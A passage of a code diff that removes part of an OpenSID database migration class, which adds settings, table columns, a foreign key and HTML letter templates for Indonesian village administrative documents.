@@ -1,2794 +1,673 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-use App\Enums\StatusEnum;
-use App\Models\FormatSurat;
-use Illuminate\Support\Facades\DB;
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Migrasi_fitur_premium_2307 extends MY_model
-{
-    public function up()
-    {
-        $hasil = true;
-
-        // Jalankan migrasi sebelumnya
-        $hasil = $hasil && $this->jalankan_migrasi('migrasi_fitur_premium_2306', false);
-        $hasil = $hasil && $this->migrasi_tabel($hasil);
-
-        return $hasil && $this->migrasi_data($hasil);
-    }
-
-    protected function migrasi_tabel($hasil)
-    {
-        // Data perlu dihapus karena ada perubahan struktur tabel
-        $hasil = $hasil && $this->migrasi_2023060451($hasil);
-        $hasil = $hasil && $this->migrasi_2023060452($hasil);
-        $hasil = $hasil && $this->migrasi_2023061271($hasil);
-        $hasil = $hasil && $this->migrasi_2023061351($hasil);
-        $hasil = $hasil && $this->migrasi_2023061451($hasil);
-        $hasil = $hasil && $this->migrasi_2023061752($hasil);
-        $hasil = $hasil && $this->migrasi_2023061751($hasil);
-        $hasil = $hasil && $this->migrasi_2023062871($hasil);
-
-        return $hasil && true;
-    }
-
-    // Migrasi perubahan data
-    protected function migrasi_data($hasil)
-    {
-        // Migrasi berdasarkan config_id
-        $config_id = DB::table('config')->pluck('id')->toArray();
-
-        foreach ($config_id as $id) {
-            $hasil = $hasil && $this->migrasi_2023060571($hasil, $id);
-            $hasil = $hasil && $this->migrasi_2023060573($hasil, $id);
-            $hasil = $hasil && $this->migrasi_2023061251($hasil, $id);
-
-            // Jalankan Migrasi TinyMCE'
-            $hasil = $hasil && $this->migrasi_2023062251($hasil, $id);
-            $hasil = $hasil && $this->suratKetDomisili($hasil, $id);
-            $hasil = $hasil && $this->suratLahirMati($hasil, $id);
-            $hasil = $hasil && $this->suratPenerbitanBukuPas($hasil, $id);
-            $hasil = $hasil && $this->suratKepemilikanKendaraan($hasil, $id);
-            $hasil = $hasil && $this->suratKeteranganPenghasilanOrangTua($hasil, $id);
-            $hasil = $hasil && $this->suratBiodataPenduduk($hasil, $id);
-            $hasil = $hasil && $this->suratPerintahPerjalananDinas($hasil, $id);
-            $hasil = $hasil && $this->suratPermohonanDuplikatNikah($hasil, $id);
-            $hasil = $hasil && $this->suratKeteranganKepemilikanTanah($hasil, $id);
-            $hasil = $hasil && $this->suratPermohonanDuplikatKelahiran($hasil, $id);
-            $hasil = $hasil && $this->suratPermohonanKartuKeluarga($hasil, $id);
-            $hasil = $hasil && $this->suratKeteranganPengantarRujukCerai($hasil, $id);
-            $hasil = $hasil && $this->suratPermohonanPerubahanKartuKeluarga($hasil, $id);
-            // Jalankan Migrasi TinyMCE
-        }
-        // Migrasi tanpa config_id
-        $hasil = $hasil && $this->migrasi_2023060572($hasil);
-        $hasil = $hasil && $this->migrasi_2023061451($hasil);
-        $hasil = $hasil && $this->migrasi_2023061452($hasil);
-        $hasil = $hasil && $this->migrasi_2023061552($hasil);
-        $hasil = $hasil && $this->migrasi_2023061951($hasil);
-
-        return $hasil && true;
-    }
-
-    protected function migrasi_2023060451($hasil)
-    {
-        DB::table('log_penduduk')->whereNotIn('id_pend', static function ($q) {
-            return $q->select('id')->from('tweb_penduduk');
-        })->delete();
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023060452($hasil)
-    {
-        $db    = $this->db->database;
-        $query = "
-            SELECT COUNT(1) ConstraintSudahAda
-            FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS
-            WHERE TABLE_SCHEMA = ?
-            AND TABLE_NAME = 'log_penduduk'
-            AND CONSTRAINT_NAME = 'fk_tweb_penduduk'
-        ";
-        $checkConstraint = DB::select($query, [$db])[0];
-        if ($checkConstraint->ConstraintSudahAda <= 0) {
-            DB::statement('alter table log_penduduk add CONSTRAINT fk_tweb_penduduk foreign key (id_pend) REFERENCES tweb_penduduk(id) ON UPDATE CASCADE ON DELETE CASCADE');
-        }
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023060571($hasil, $id)
-    {
-        return $hasil && $this->tambah_setting([
-            'judul'      => 'Tampilkan Tombol Peta',
-            'key'        => 'tampilkan_tombol_peta',
-            'value'      => $value = '["Statistik Penduduk", "Statistik Bantuan", "Aparatur Desa", "Kepala Wilayah"]',
-            'keterangan' => 'Tampilkan tombol di peta',
-            'jenis'      => 'multiple-option',
-            'option'     => $value,
-            'attribute'  => null,
-            'kategori'   => 'peta',
-        ], $id);
-    }
-
-    protected function migrasi_2023060572($hasil)
-    {
-        $this->db->where_in('key', [
-            'max_zoom_peta',
-            'min_zoom_peta',
-            'mapbox_key',
-            'tampil_luas_peta',
-        ])
-            ->where('kategori !=', 'peta')
-            ->update('setting_aplikasi', ['kategori' => 'peta']);
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023060573($hasil, $id)
-    {
-        return $hasil && $this->tambah_setting([
-            'judul'      => 'Margin Global',
-            'key'        => 'surat_margin',
-            'value'      => json_encode(FormatSurat::MARGINS),
-            'keterangan' => 'Margin Global untuk surat',
-            'jenis'      => null,
-            'option'     => null,
-            'attribute'  => null,
-            'kategori'   => 'format_surat',
-        ], $id);
-    }
-
-    protected function migrasi_2023061251($hasil, $id)
-    {
-        return $hasil && $this->tambah_setting([
-            'judul'      => 'Kunci Pilihan Tema',
-            'key'        => 'lock_theme',
-            'value'      => 1,
-            'keterangan' => '1. bisa ganti tema, 0. tidak bisa pilih tema',
-            'kategori'   => 'openkab',
-            'jenis'      => 'option',
-            'option'     => '{"0": "Kunci","1": "Bebas pilih"}',
-        ], $id);
-    }
-
-    protected function migrasi_2023061271($hasil)
-    {
-        if (! $this->db->field_exists('foto', 'widget')) {
-            $hasil = $hasil && $this->dbforge->add_column('widget', [
-                'foto' => [
-                    'type'       => 'varchar',
-                    'constraint' => 255,
-                    'null'       => true,
-                ],
-            ]);
-        }
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023061351($hasil)
-    {
-        $fields = [];
-
-        if (! $this->db->field_exists('Kd_Bank', 'keuangan_ta_spp')) {
-            $fields['Kd_Bank'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Nm_Bank', 'keuangan_ta_spp')) {
-            $fields['Nm_Bank'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Nm_Penerima', 'keuangan_ta_spp')) {
-            $fields['Nm_Penerima'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Ref_Bayar', 'keuangan_ta_spp')) {
-            $fields['Ref_Bayar'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Rek_Bank', 'keuangan_ta_spp')) {
-            $fields['Rek_Bank'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Rek_Bank', 'keuangan_ta_spp')) {
-            $fields['Rek_Bank'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Tgl_Bayar', 'keuangan_ta_spp')) {
-            $fields['Tgl_Bayar'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if (! $this->db->field_exists('Validasi', 'keuangan_ta_spp')) {
-            $fields['Validasi'] = [
-                'type'       => 'VARCHAR',
-                'constraint' => 100,
-                'null'       => true,
-            ];
-        }
-
-        if ($fields) {
-            $hasil = $hasil && $this->dbforge->add_column('keuangan_ta_spp', $fields);
-        }
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023061451($hasil)
-    {
-        if (! $this->db->field_exists('slug', 'user_grup')) {
-            $hasil = $hasil && $this->dbforge->add_column('user_grup', [
-                'slug' => [
-                    'type'       => 'varchar',
-                    'constraint' => 255,
-                    'null'       => true,
-                    'after'      => 'nama',
-                ],
-            ]);
-
-            if ($this->cek_indeks('user_grup', 'nama_grup_config')) {
-                $hasil = $hasil && $this->db->query('ALTER TABLE `user_grup` DROP INDEX `nama_grup_config`, ADD UNIQUE INDEX `slug_config` (`config_id`, `slug`)');
-            }
-        }
-
-        $data = [];
-
-        foreach ($this->db->get_where('user_grup', ['slug' => null])->result() as $row) {
-            $data[] = [
-                'id'   => $row->id,
-                'slug' => unique_slug('user_grup', $row->nama),
-            ];
-        }
-
-        if ($data) {
-            $hasil = $hasil && $this->db->update_batch('user_grup', $data, 'id');
-        }
-
-        // Hapus cache menu navigasi
-        $this->cache->hapus_cache_untuk_semua('_cache_modul');
-
-        return $hasil;
-    }
-
-    protected function migrasi_2023061452($hasil)
-    {
-        $check = $this->db
-            ->where_in('Nama_Bidang', [
-                'BIDANG PEMBINAAN KEMASYARAKATAN',
-                'BIDANG PEMBERDAYAAN MASYARAKAT',
-            ])
-            ->get('keuangan_manual_ref_bidang')
-            ->result_array();
-
-        if ($check) {
-            // keuangan manual ref bidang
-            foreach ([
-                ['3', 'BIDANG PEMBINAAN KEMASYARAKATAN DESA'],
-                ['4', 'BIDANG PEMBERDAYAAN MASYARAKAT DESA'],
-            ] as $value) {
-                [$id, $nama_bidang] = $value;
-
-                $hasil = $hasil && $this->db
-                    ->where('id', $id)
-                    ->set('Nama_Bidang', $nama_bidang)
-                    ->update('keuangan_manual_ref_bidang');
-            }
-        }
-
-        return $hasil;
-    }
-
-    protected function suratKetDomisili($hasil, $id)
-    {
-        $nama_surat = 'Keterangan Domisili';
-
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-41',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"textarea","kode":"[form_keperluan]","nama":"Keperluan","deskripsi":"Masukkan Keperluan","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>\r\n<p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa :</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 195.75px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">1.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Nama Lengkap</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\"><strong>[NAma]</strong></td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">2.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">NIK / No. KTP</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[Nik]</td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">3.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[TtL]</td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">4.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Jenis Kelamin</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[Jenis_kelamin]</td>\r\n</tr>\r\n<tr style=\"height: 21px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 21px;\"> </td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 21px;\">5.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 21px;\">Agama</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 21px;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 21px;\">[AgAma]</td>\r\n</tr>\r\n<tr style=\"height: 20.25px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 20.25px;\"> </td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 20.25px;\">6.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 20.25px;\">Status</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 20.25px;\"> </td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 20.25px;\">[Status_kawin]</td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">7..</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Pendidikan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[Pendidikan_kk]</td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">8.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Pekerjaan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[PeKerjaan]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 4.3222%; text-align: center;\"> </td>\r\n<td style=\"width: 3.92927%; text-align: left;\">9.</td>\r\n<td style=\"width: 30.5174%; text-align: left;\">Kewarganegaraan</td>\r\n<td style=\"width: 1.24427%; text-align: center;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify;\">[WArga_negara]</td>\r\n</tr>\r\n<tr style=\"height: 36px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 36px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 36px; text-align: left;\">10.<br /><br /></td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 36px;\">Alamat / Tempat Tinggal<br /><br /></td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 36px;\">:<br /><br /></td>\r\n<td style=\"width: 60.0524%; height: 36px; text-align: justify;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Orang tersebut di atas adalah benar-benar warga kami yang bertempat tinggal di [AlamaT] [Sebutan_desa] [NaMa_desa] dan tercatat dengan No. KK : [No_kK] Kepala Keluarga : [Kepala_kK].</p>\r\n<p style=\"text-align: justify; text-indent: 30px;\"><br />       Surat Keterangan ini dibuat untuk Keperluan : <strong>[Form_keperluaN]</strong><br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Demikian surat keterangan ini dibuat dengan sebenarnya, untuk dipergunakan sebagaimana mestinya.<br /><br /></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 144px;\" border=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[NaMa_desa], [TgL_surat]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[Atas_namA]</td>\r\n</tr>\r\n<tr style=\"height: 72px;\">\r\n<td style=\"width: 35%; text-align: center; height: 72px;\"> </td>\r\n<td style=\"width: 30%; height: 72px;\"><br /><br /><br /><br /></td>\r\n<td style=\"width: 35%; height: 72px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[Nama_pamonG]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[SEbutan_nip_desa] : [nip_pamong]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<div style=\"text-align: center;\"><br />[qr_code]</div>",
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratLahirMati($hasil, $id)
-    {
-        $nama_surat = 'Keterangan Lahir Mati';
-
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-22',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_hari]","nama":"Hari","deskripsi":"Masukkan hari","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal]","nama":"Tanggal","deskripsi":"Masukkan Tanggal","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_tempat_mati]","nama":"Tempat Mati","deskripsi":"Masukkan tempat lahir mati","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_hubungan]","nama":"Hubungan","deskripsi":"Masukkan hubungan dengan yang lahir mati","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_pelapor]","nama":"Pelapor","deskripsi":"Masukkan nama pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"number","kode":"[form_lama_kandungan]","nama":"Lama Kandungan","deskripsi":"Masukkan lama kandungan dalam bulan","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>\r\n<p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa seorang ibu :</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 144.875px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">1.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Nama Lengkap</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\"><strong>[NAma]</strong></td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">2.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">NIK / No. KTP</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[Nik]</td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">3.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[TtL]</td>\r\n</tr>\r\n<tr style=\"height: 36px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 36px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 36px; text-align: left;\">4.<br /><br /></td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 36px;\">Alamat / Tempat Tinggal<br /><br /></td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 36px;\">:<br /><br /></td>\r\n<td style=\"width: 60.0524%; height: 36px; text-align: justify;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>\r\n</tr>\r\n<tr style=\"height: 10px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 10px;\"> </td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 10px;\">5.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 10px;\">Agama</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 10px;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 10px;\">[AgAma]</td>\r\n</tr>\r\n<tr style=\"height: 19.75px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.75px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.75px; text-align: left;\">6.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.75px;\">Pekerjaan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.75px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.75px; text-align: justify;\">[PeKerjaan]</td>\r\n</tr>\r\n<tr style=\"height: 19.875px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.875px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 19.875px; text-align: left;\">7.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.875px;\">Kewarganegaraan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.875px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.875px; text-align: justify;\">[Warga_negarA]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Telah lahir bayi dalam keadaan mati, setelah dikandungannya selama [Form_lama_kandungaN] bulan:</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 34.391px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 18px; text-align: left;\">8.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 18px;\">Pada hari, tanggal</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 18px; text-align: justify;\">[Form_harI], [Form_tanggaL]</td>\r\n</tr>\r\n<tr style=\"height: 16.391px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 16.391px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 16.391px; text-align: left;\">9.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 16.391px;\">Di</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 16.391px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 16.391px; text-align: justify;\">[Form_tempat_matI]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Surat keterangan ini dibuat berdasarkan keterangan pelapor:</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 28px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 18px; text-align: left;\">10.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 18px;\">Nama Lengkap</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 18px; text-align: justify;\">[Form_pelapoR]</td>\r\n</tr>\r\n<tr style=\"height: 10px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 10px;\"> </td>\r\n<td style=\"width: 3.92927%; height: 10px; text-align: left;\">11.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 10px;\">Hubungan dgn yang lahir mati</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 10px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 10px; text-align: justify;\">[Form_hubungaN]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Demikian surat keterangan ini dibuat dengan sebenarnya, untuk dipergunakan sebagaimana mestinya.<br /><br /></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 144px;\" border=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[NaMa_desa], [TgL_surat]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[Atas_namA]</td>\r\n</tr>\r\n<tr style=\"height: 72px;\">\r\n<td style=\"width: 35%; text-align: center; height: 72px;\"> </td>\r\n<td style=\"width: 30%; height: 72px;\"><br /><br /><br /><br /></td>\r\n<td style=\"width: 35%; height: 72px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[Nama_pamonG]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; height: 18px;\"> </td>\r\n<td style=\"width: 30%; height: 18px;\"> </td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[SEbutan_nip_desa] : [nip_pamong]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<div style=\"text-align: center;\"> </div>",
-        ];
-
